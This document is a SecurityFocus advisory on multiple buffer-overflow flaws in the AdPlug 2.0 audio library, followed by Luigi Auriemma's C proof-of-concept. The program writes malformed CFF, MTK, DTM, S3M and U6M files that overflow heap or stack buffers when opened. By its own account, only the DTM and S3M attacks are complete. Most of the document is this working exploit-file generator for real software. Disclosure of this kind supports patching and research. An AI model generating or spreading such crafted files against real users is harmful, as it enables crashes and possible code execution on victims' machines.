source: http://www.securityfocus.com/bid/18859/info

The AdPlug library is affected by multiple remote buffer-overflow vulnerabilities. These issues are due to the library's failure to properly bounds-check user-supplied input before copying it into insufficiently sized memory buffers.

These issues allow remote attackers to execute arbitrary machine code in the context of the user running applications that use the affected library to open attacker-supplied malicious files.

The AdPlug library version 2.0 is vulnerable to these issues; previous versions may also be affected.

/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>



#define VER                     "0.1"
#define MODULESIZE              0x10000

#define LOWORD(l)               ((l) & 0xffff)
#define HIWORD(l)               ((l) >> 16)
#define LOBYTE(w)               ((w) & 0xff)
#define HIBYTE(w)               ((w) >> 8)
#define ARRAY_AS_DWORD(a, i)    ((a[i + 3] << 24) + (a[i + 2] << 16) + (a[i + 1] << 8) + a[i])
#define ARRAY_AS_WORD(a, i)     ((a[i + 1] << 8) + a[i])
#define CHARP_AS_WORD(p)        (((*(p + 1)) << 8) + (*p))



unsigned short dmo_unpacker_brand(unsigned short range);
int dmo_unpacker_decrypt(unsigned char *buf, long len);
void std_err(void);



#pragma pack(1)

struct {
    char            id[16];
    unsigned char   version;
    unsigned short  size;
    unsigned char   packed;
    unsigned char   reserved[12];
} cff_head;

struct {
    char            id[18];
    unsigned short  crc;
    unsigned short  size;
} mtk_head;

struct {
    char            id[12];
    unsigned char   version;
    char            title[20];
    char            author[20];
    unsigned char   numpat;
    unsigned char   numinst;
} dtm_head;

struct {
    char            name[28];
    unsigned char   kennung;
    unsigned char   typ;
    unsigned char   dummy[2];
    unsigned short  ordnum;
    unsigned short  insnum;
    unsigned short  patnum;
    unsigned short  flags;
    unsigned short  cwtv;
    unsigned short  ffi;
    char            scrm[4];
    unsigned char   gv;
    unsigned char   is;
    unsigned char   it;
    unsigned char   mv;
    unsigned char   uc;
    unsigned char   dp;
    unsigned char   dummy2[8];
    unsigned short  special;
    unsigned char   chanset[32];
} s3m_head;

#pragma pack()



int main(int argc, char *argv[]) {
    FILE            *fd;
    int             i,
                    j,
                    attack,
                    buffsz,
                    compsz;
    unsigned char   *buff,
                    *comp;

    fputs("\n"
        "AdPlug library <= 2.0 and CVS <= 04 Jul 2006 multiple overflow "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <attack> <file_to_create>\n"
            "\n"
            "Attack:\n"
            " 1 = heap overflow in the unpacking of CFF files\n"
            " 2 = heap overflow in the unpacking of MTK files\n"
            " 3 = heap overflow in the unpacking of DMO files\n"
            " 4 = buffer-overflow in DTM files\n"
            " 5 = buffer-overflow in S3M files\n"
            " 6 = heap overflow in the unpacking of U6M files\n"
            "\n"
            "Note: this proof-of-concept is experimental and doesn't contain the code for\n"
            "      compressing the data so you must edit it for adding the missing code if\n"
            "      you have it\n"
            "      Actually only attack 4 and 5 can be considered completed!\n"
            "\n", argv[0]);
        exit(1);
    }

    attack = atoi(argv[1]);

    printf("- create file %s\n", argv[2]);
    fd = fopen(argv[2], "rb");
    if(fd) {
        fclose(fd);
        printf("- do you want to overwrite it (y/N)?\n  ");
        fflush(stdin);
        if((fgetc(stdin) | 0x20) != 'y') exit(1);
    }
    fd = fopen(argv[2], "wb");
    if(!fd) std_err();

    if(attack == 1) {                   /* CFF */
        buffsz  = MODULESIZE + 256;

        buff = malloc(buffsz);

        memset(buff,                0,                                  MODULESIZE);
        memcpy(&buff[0x5E1],        "CUD-FM-File - SEND A POSTCARD -",  31);    // for quick return
        memset(buff + MODULESIZE,   'a',                                buffsz - MODULESIZE);

        /*
            DATA MUST BE COMPRESSED WITH A PARTICULAR TYPE OF LZW!!!
            I DON'T KNOW THE COMPRESSION ALGORITHM SO DATA IS STORED AS IS
        */
        // compsz = 16 + compress(buff, comp + 16, buffsz);
        comp   = buff;
        compsz = buffsz;

        memcpy(comp,                "YsComp""\x07""CUD1997""\x1A\x04",  16);

        memcpy(cff_head.id,         "<CUD-FM-File>""\x1A\xDE\xE0",      sizeof(cff_head.id));
        cff_head.version = 1;
        cff_head.size    = compsz;
        cff_head.packed  = 1;
        memset(cff_head.reserved, 0, sizeof(cff_head.reserved));

        fwrite(&cff_head, sizeof(cff_head), 1, fd);
        fwrite(comp,      compsz,           1, fd);

    } else if(attack == 2) {            /* MTK */
        buffsz = 0xffff;

        buff = malloc(buffsz);

        memset(buff,                'a',                                buffsz);

        /*
            DATA MUST BE COMPRESSED!!!
            I DON'T KNOW THE COMPRESSION ALGORITHM SO DATA IS STORED AS IS
        */
        // compsz = compress(buff, comp, buffsz);
        comp   = buff;
        compsz = buffsz;

        strncpy(mtk_head.id,    "mpu401tr\x92kk\xeer@data",             18);
        mtk_head.crc     = 0;
        mtk_head.size    = 0;   // heap overflow

        fwrite(&mtk_head, sizeof(mtk_head), 1, fd);
        fwrite(comp,      compsz,           1, fd);

    } else if(attack == 3) {            /* DMO */
        printf("- not implemented!\n");

    } else if(attack == 4) {            /* DTM */
        strncpy(dtm_head.id,    "DeFy DTM ",                            sizeof(dtm_head.id));
        dtm_head.version = 0x10;
        strncpy(dtm_head.title, "title",                                sizeof(dtm_head.title));
        strncpy(dtm_head.author,"author",                               sizeof(dtm_head.author));
        dtm_head.numpat  = 0;
        dtm_head.numinst = 0;

        fwrite(&dtm_head, sizeof(dtm_head), 1, fd);

        for(i = 0; i < 15; i++) fputc(0, fd);
        buffsz = 140;                   // <== buffer-overflow
        buff = malloc(buffsz);
        memset(buff, 'a', buffsz);
        fputc(buffsz, fd);
        fwrite(buff,      buffsz,         1, fd);

        for(i = 0; i < 100; i++) fputc(0, fd);

    } else if(attack == 5) {            /* S3M */
        strncpy(s3m_head.name,  "name", sizeof(s3m_head.name));
        s3m_head.kennung = 0x1a;
        s3m_head.typ     = 16;
        memset(s3m_head.dummy,  0,      sizeof(s3m_head.dummy));
        s3m_head.ordnum  = 0;
        s3m_head.insnum  = 120;         // <== buffer-overflow
        s3m_head.patnum  = 0;           // <== buffer-overflow
        s3m_head.flags   = 0;
        s3m_head.cwtv    = 0;
        s3m_head.ffi     = 0;
        memcpy(s3m_head.scrm,   "SCRM", sizeof(s3m_head.scrm));
        s3m_head.gv      = 0;
        s3m_head.is      = 0;
        s3m_head.it      = 0;
        s3m_head.mv      = 0;
        s3m_head.uc      = 0;
        s3m_head.dp      = 0;
        memset(s3m_head.dummy2, 0,      sizeof(s3m_head.dummy2));
        s3m_head.special = 0;
        for(i = 0; i < 32; i++) s3m_head.chanset[i] = 0;

        fwrite(&s3m_head, sizeof(s3m_head), 1, fd);
        for(i = 0; i < s3m_head.ordnum; i++) fputc('a', fd);
        for(i = 0; i < s3m_head.insnum; i++) { fputc('1', fd); fputc('0', fd); }    // little endian
        for(i = 0; i < s3m_head.patnum; i++) { fputc('1', fd); fputc('0', fd); }    // little endian

        for(i = 0; i < s3m_head.insnum; i++) {
            for(j = 0; j < 80; j++) fputc(0, fd);
        }

        for(i = 0; i < s3m_head.patnum; i++) {
            /* skipped */
        }

    } else if(attack == 6) {            /* U6M */
        buffsz = 1000;
        buff   = malloc(buffsz);

        memset(buff, 0, buffsz);
        /*
            DATA MUST BE COMPRESSED WITH A PARTICULAR TYPE OF LZW!!!
            I DON'T KNOW THE COMPRESSION ALGORITHM SO DATA IS STORED AS IS
        */
        // compsz = compress(buff, comp, buffsz);
        comp   = buff;
        compsz = buffsz;

        fputc(buffsz        & 0xff, fd);
        fputc((buffsz >> 8) & 0xff, fd);
        fputc(0, fd);
        fputc(0, fd);
        fputc(0, fd);
        fputc(1, fd);

        fwrite(comp,      compsz,           1, fd);
    }

    fclose(fd);
    printf("- finished\n");
    return(0);
}



void std_err(void) {
    perror("\nError");
    exit(1);
}